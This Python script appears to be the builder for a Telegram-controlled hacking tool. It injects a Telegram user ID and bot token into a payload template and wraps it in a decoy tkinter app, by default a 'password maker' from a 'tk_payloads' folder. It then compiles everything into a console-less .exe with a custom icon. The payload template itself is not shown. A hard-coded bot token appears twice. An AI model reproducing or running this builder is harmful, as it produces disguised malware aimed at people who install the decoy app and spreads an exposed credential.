# MSTL Bot Normal Token: 6622962602:AAERgZlXugMGZIA5vqkIpv5KKAAsDUrA6is
from colorama import init, Fore
from os import system
import requests
from json import loads
init()
def banner():
    from random import randint
    banners = [r"""

          _____                            _____                        _____                            _____  
         /\    \                          /\    \                      /\    \                          /\    \ 
        /::\____\                        /::\    \                    /::\    \                        /::\____\
       /::::|   |                       /::::\    \                   \:::\    \                      /:::/    /
      /:::::|   |                      /::::::\    \                   \:::\    \                    /:::/    / 
     /::::::|   |                     /:::/\:::\    \                   \:::\    \                  /:::/    /  
    /:::/|::|   |                    /:::/__\:::\    \                   \:::\    \                /:::/    /   
   /:::/ |::|   |                    \:::\   \:::\    \                  /::::\    \              /:::/    /    
  /:::/  |::|___|______            ___\:::\   \:::\    \                /::::::\    \            /:::/    /     
 /:::/   |::::::::\    \          /\   \:::\   \:::\    \              /:::/\:::\    \          /:::/    /      
/:::/    |:::::::::\____\        /::\   \:::\   \:::\____\            /:::/  \:::\____\        /:::/____/       
\::/    / ~~~~~/:::/    /        \:::\   \:::\   \::/    /           /:::/    \::/    /        \:::\    \       
 \/____/      /:::/    /          \:::\   \:::\   \/____/           /:::/    / \/____/          \:::\    \      
             /:::/    /            \:::\   \:::\    \              /:::/    /                    \:::\    \     
            /:::/    /              \:::\   \:::\____\            /:::/    /                      \:::\    \    
           /:::/    /                \:::\  /:::/    /            \::/    /                        \:::\    \   
          /:::/    /                  \:::\/:::/    /              \/____/                          \:::\    \  
         /:::/    /                    \::::::/    /                                                 \:::\    \ 
        /:::/    /                      \::::/    /                                                   \:::\____\ 
        \::/    /                        \::/    /                                                     \::/    /
         \/____/                          \/____/                                                       \/____/ 
                                                                                                                    
""", """
                                                                                                                
MMMMMMMM               MMMMMMMM        SSSSSSSSSSSSSSS      TTTTTTTTTTTTTTTTTTTTTTT     LLLLLLLLLLL             
M:::::::M             M:::::::M      SS:::::::::::::::S     T:::::::::::::::::::::T     L:::::::::L             
M::::::::M           M::::::::M     S:::::SSSSSS::::::S     T:::::::::::::::::::::T     L:::::::::L             
M:::::::::M         M:::::::::M     S:::::S     SSSSSSS     T:::::TT:::::::TT:::::T     LL:::::::LL             
M::::::::::M       M::::::::::M     S:::::S                 TTTTTT  T:::::T  TTTTTT       L:::::L               
M:::::::::::M     M:::::::::::M     S:::::S                         T:::::T               L:::::L               
M:::::::M::::M   M::::M:::::::M      S::::SSSS                      T:::::T               L:::::L               
M::::::M M::::M M::::M M::::::M       SS::::::SSSSS                 T:::::T               L:::::L               
M::::::M  M::::M::::M  M::::::M         SSS::::::::SS               T:::::T               L:::::L               
M::::::M   M:::::::M   M::::::M            SSSSSS::::S              T:::::T               L:::::L               
M::::::M    M:::::M    M::::::M                 S:::::S             T:::::T               L:::::L               
M::::::M     MMMMM     M::::::M                 S:::::S             T:::::T               L:::::L         LLLLLL
M::::::M               M::::::M     SSSSSSS     S:::::S           TT:::::::TT           LL:::::::LLLLLLLLL:::::L
M::::::M               M::::::M     S::::::SSSSSS:::::S           T:::::::::T           L::::::::::::::::::::::L
M::::::M               M::::::M     S:::::::::::::::SS            T:::::::::T           L::::::::::::::::::::::L
MMMMMMMM               MMMMMMMM      SSSSSSSSSSSSSSS              TTTTTTTTTTT           LLLLLLLLLLLLLLLLLLLLLLLL
                                                                                                                
""", """

 _______    _______   _________   _       
(       )  (  ____ \  \__   __/  ( \      
| () () |  | (    \/     ) (     | (      
| || || |  | (_____      | |     | |      
| |(_)| |  (_____  )     | |     | |      
| |   | |        ) |     | |     | |      
| )   ( |  /\____) |     | |     | (____/\ 
|/     \|  \_______)     )_(     (_______/
                                          
""", """

.        :        .::::::.     ::::::::::::     :::     
;;,.    ;;;      ;;;`    `     ;;;;;;;;''''     ;;;     
[[[[, ,[[[[,     '[==/[[[[,         [[          [[[     
$$$$$$$$"$$$       '''    $         $$          $$'     
888 Y88" 888o     88b    dP         88,        o88oo,.__
MMM  M'  "MMM      "YMmMY"          MMM        ;;;;;YUMMM

"""]
    import os
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + banners[randint(0, 3)])
def make_python(ID, TOKEN, NAME, CODE_ADDR, OFFLINE_CODE_ADDR):
    with open("builder/build.py", "r") as read: 
        text = read.readlines()
        with open(CODE_ADDR, "r") as read:
            reader = read.readlines()
            reader = "".join(reader)
            reader = reader.split("\n")
            tkinter_code = """"""
            for i in reader:
                tkinter_code += f"    {i}\n"
        with open(OFFLINE_CODE_ADDR, "r") as read:
            reader = read.readlines()
            reader = "".join(reader)
            reader = reader.split("\n")
            offline_tkinter_code = """"""
            for i in reader:
                offline_tkinter_code += f"    {i}\n"
        text = "".join(text).replace("TELEGRAM_ID", ID).replace("BOT_TOKEN", f'"{TOKEN}"').replace("TK_CODE", tkinter_code).replace("OFFLINE_TKINTER_CODE", offline_tkinter_code)
    system("mkdir output")
    with open(f"output/{NAME}.py", "w") as write:
        write.write(text)
    print(Fore.GREEN + "File is created in /output directory.")
def make_exe(NAME, ICON): 
    system("mkdir output/exe")
    system(f"pyinstaller --name {NAME} --onefile -i {ICON} --noconsole --distpath output/exe output/{NAME}.py")
    print(Fore.GREEN + ".exe application is created in /output/exe/mstl")
def check_update(): 
    online_version = loads(requests.get("https://raw.githubusercontent.com/Unknow-per/MS-TL-hacking-tool/main/log/version.json").text)
    with open("log/version.json", "r") as file:
        local_version = loads(file.read())
    if online_version["version"] == local_version["version"]: pass
    else: 
        print(Fore.RED + "Please update the program with 'git pull' command.")
        exit()
banner()
check_update()
try: 
    id = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your telegram user id(with @userinfobot): "))
    tok = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " If you want to use custome token write C if not press enter: ")).lower()
    if tok == "c":
        token = input("Write your bot token: ")
    else: 
        token = "6622962602:AAERgZlXugMGZIA5vqkIpv5KKAAsDUrA6is"
    name = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " If you want to use custome name write C if not press enter: ")).lower()
    if name == "c": 
        name = input("Write your app name(ex: mstl): ")
    else: 
        name = "mstl"
    icon = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " If you want to use custome icon write C if not press enter: ")).lower()    
    if icon == "c":
        icon = input("write your icon file address(.ico file): ")
        if icon.endswith(".ico"): pass
    else: 
        icon = "icongallery/icon.ico"
    code_addr = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " If you want to use your custome tkinter code write C if not press enter: ")).lower()    
    if code_addr == "c":
        code_addr = input("write your code address(.py file): ")
        if code_addr.endswith(".py"): pass
    else: 
        code_addr = "builder/tk_payloads/password_maker.py"
    offline_code_addr = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " If you want to use your custome offline tkinter code write C if not press enter: ")).lower()    
    if code_addr == "c":
        offline_code_addr = input("write your code address(.py file): ")
        if code_addr.endswith(".py"): pass
    else: 
        offline_code_addr = "builder/tk_payloads/offline/no_internet.py"
    make_python(ID=id, TOKEN=token, NAME=name, CODE_ADDR=code_addr, OFFLINE_CODE_ADDR=offline_code_addr)
    opt = input(Fore.YELLOW + "Make it exe(Y for yes and N for no)? " + Fore.RESET).lower()
    if opt == "y": 
        make_exe(NAME=name, ICON=icon)
    else: 
        exit(Fore.CYAN + "\n\n Good Luck \n\n" + Fore.RESET)
except ValueError: print(Fore.RED + "You must write str."), exit()
except KeyboardInterrupt: exit("\n\n\nGood Luck\n\n")
